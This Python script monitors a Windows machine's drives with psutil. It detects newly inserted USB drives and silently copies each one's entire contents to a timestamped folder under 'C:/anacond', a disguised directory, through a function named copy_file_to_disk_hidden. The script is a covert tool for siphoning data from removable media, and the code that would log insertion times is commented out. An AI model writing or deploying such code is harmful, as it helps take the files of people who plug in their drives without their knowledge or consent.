# -*- coding: utf-8 -*-
"""
Created on Mon Jun 17 13:40:13 2019

@author: Forry
"""

import psutil
import sys
import os
import time
from datetime import datetime
import shutil

"""全局数据 实时更新"""
local_device = []  # 本地硬盘
local_letter = []  # 本地盘符
local_number = 0  # 本地硬盘数
local_cdrom = []
local_cdrom_letter = []
local_cdrom_number = 0
mobile_device = []  # 移动设备
mobile_letter = []  # 移动设备盘符
mobile_number = 0  # 移动设备数


def updata():
    global local_device, local_letter, local_number, mobile_device, \
        mobile_letter, mobile_number, local_cdrom, local_cdrom_letter, local_cdrom_number

    # 引入全局变量
    tmp_local_device, tmp_local_letter = [], []
    tmp_mobile_device, tmp_mobile_letter = [], []
    tmp_local_cdrom, tmp_local_cdrom_letter = [], []
    tmp_local_number, tmp_mobile_number, tmp_local_cdrom_number = 0, 0, 0

    try:
        part = psutil.disk_partitions()
    except:
        print("程序发生异常!!!")
        sys.exit(-1)
    else:
        # 驱动器分类
        for i in range(len(part)):
            tmplist = part[i].opts.split(",")
            if "fixed" in tmplist:  # 挂载选项数据内读到fixed = 本地设备
                tmp_local_number = tmp_local_number + 1
                tmp_local_letter.append(part[i].device[:2])  # 得到盘符信息
                tmp_local_device.append(part[i])
            elif "cdrom" in tmplist:
                tmp_local_cdrom_number = tmp_local_cdrom_number + 1
                tmp_local_cdrom_letter.append(part[i].device[:2])
                tmp_local_cdrom.append(part[i])
            else:
                tmp_mobile_number = tmp_mobile_number + 1
                tmp_mobile_letter.append(part[i].device[:2])
                tmp_mobile_device.append(part[i])

        # 浅切片
        local_device, local_letter = tmp_local_device[:], tmp_local_letter[:]
        mobile_device, mobile_letter = tmp_mobile_device[:], tmp_mobile_letter[:]
        local_number, mobile_number, local_cdrom_number = tmp_local_number, tmp_mobile_number, tmp_local_cdrom_number
        local_cdrom, local_cdrom_letter = tmp_local_cdrom[:], tmp_local_cdrom_letter[:]
    return len(part)  # 返回当前驱动器数


def print_device(n):
    global local_device, local_letter, local_number, mobile_device, mobile_letter, mobile_number, local_cdrom, local_cdrom_letter, local_cdrom_number
    print("读取到" + str(n) + "个驱动器磁盘")

    print("------->", end="")
    for l in range(local_number):
        print(local_letter[l], end="")  # 列出本地驱动器盘符
    print("是本地硬盘")

    print("------->", end="")
    for l in range(local_cdrom_number):
        print(local_cdrom_letter[l], end="")  # 列出本地驱动器盘符
    print("是CD驱动器")

    if len(mobile_device):  # 列出移动驱动器盘符
        print("------->", end="")
        for m in range(mobile_number):
            print(mobile_letter[m], end="")
            print("是插入的移动磁盘...")
    else:
        pass
    print("进程进入监听状态 " + "*" * 10)
    return


def copy_file_to_disk_hidden(USB_path):
    # U盘的盘符
    usb_path = USB_path + "/"
    # 要复制到的路径
    save_path = "C:/anacond"

    while True:
        if os.path.exists(usb_path):
            shutil.copytree(usb_path, \
                            os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
            break
        else:
            time.sleep(5)


if __name__ == "__main__":
    # 初次读取驱动器信息，打印驱动器详细
    now_number = 0  # 实时驱动数
    before_number = updata()  # 更新数据之前的驱动数
    #print("=" * 50 + "\n此刻时间是: " + str(datetime.now()))
    print_device(before_number)

    # 进程进入循环 Loop Seconds = 1s
    while True:
        now_number = updata()
        if now_number > before_number:
            #print("=" * 50 + " \n检测到移动磁盘被插入...此刻时间是: " + str(datetime.now()))
            print_device(now_number)
            if len(mobile_device):  # 列出移动驱动器盘符
                for m in range(mobile_number):
                    copy_file_to_disk_hidden(mobile_letter[m])
            else:
                pass
            before_number = now_number  # 刷新数据
        elif now_number < before_number:
            #print("=" * 50 + " \n检测到移动磁盘被拔出...此刻时间是: " + str(datetime.now()))
            print_device(now_number)
            before_number = now_number
        time.sleep(1)
